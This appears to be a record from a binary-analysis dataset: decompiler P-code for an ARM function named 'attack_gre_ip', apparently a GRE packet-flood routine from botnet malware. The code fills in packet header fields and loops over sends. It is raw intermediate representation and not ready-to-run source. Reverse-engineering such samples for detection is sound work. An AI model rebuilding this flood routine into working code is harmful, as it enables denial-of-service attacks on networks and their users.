Label: 848
Function: attack_gre_ip
Architecture: arm
Source File: Unknown
Entry Point: 000151b0

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x10000348, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x846, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x846, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x846, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x846, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x846, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x846, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x846, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x846, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x84d, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x84d, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x84d, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe7, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x855, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x855, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x855, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x8, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffe6, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x15598, 1) , (register, 0x65, 1)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x4000, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x877, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x877, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x877, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x877, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x877, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x877, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x877, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x877, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x877, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x877, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x877, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x877, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x87e, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x87e, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x87e, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x6, 4)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x11, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x88f, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x88f, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x88f, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x9, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x891, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x891, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x891, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x891, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x891, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x891, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x891, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x891, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x891, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x891, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x891, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x891, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001ff, 4) , (register, 0x20, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x896, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x896, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x896, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0xc, 4)
(unique, 0x100001ff, 4) PTRSUB (unique, 0x1000038c, 4) , (const, 0x0, 4)
(unique, 0x1000038c, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x65, 1) INT_EQUAL (stack, 0xffffffffffffffda, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x155d4, 1) , (register, 0x65, 1)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x10000203, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000398, 4) , (const, 0x4, 4)
(unique, 0x10000398, 4) PTRSUB (unique, 0x10000203, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x8b2, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x8b2, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x8b2, 4)
(unique, 0x1000020b, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000039c, 4) , (const, 0x4, 4)
(unique, 0x1000039c, 4) PTRSUB (unique, 0x1000020b, 4) , (const, 0x0, 4)
 ---  BRANCH (ram, 0x155ec, 1)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (unique, 0x10000217, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0xc, 4)
(unique, 0x10000217, 4) PTRSUB (unique, 0x10000390, 4) , (const, 0x0, 4)
(unique, 0x10000390, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x2c, 4) INT_SUB (const, 0x3ff, 4) , (register, 0x2c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x93d, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x93d, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x93d, 4)
(unique, 0x1000021b, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000394, 4) , (const, 0x4, 4)
(unique, 0x10000394, 4) PTRSUB (unique, 0x1000021b, 4) , (const, 0x0, 4)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe4, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x8b9, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x8b9, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x8b9, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x8b9, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000223, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x8c0, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x8c0, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x8c0, 4)
(unique, 0x10000223, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe2, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x8c6, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x8c6, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x8c6, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x8c6, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x8cd, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x8cd, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x8cd, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0x2, 4)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffdc, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0x8, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x1000033c, 4) , (const, 0x0, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x906, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x906, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x906, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x906, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x906, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x906, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x906, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x906, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x906, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x906, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x906, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x906, 4)
(unique, 0x1000033c, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x90d, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x90d, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x90d, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0x4, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffa4, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffa4, 4) , (unique, 0x1000034c, 4)
 ---  CBRANCH (ram, 0x1536c, 1) , (unique, 0x2480, 1)
(unique, 0x1000034c, 4) CAST (register, 0x28, 4)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
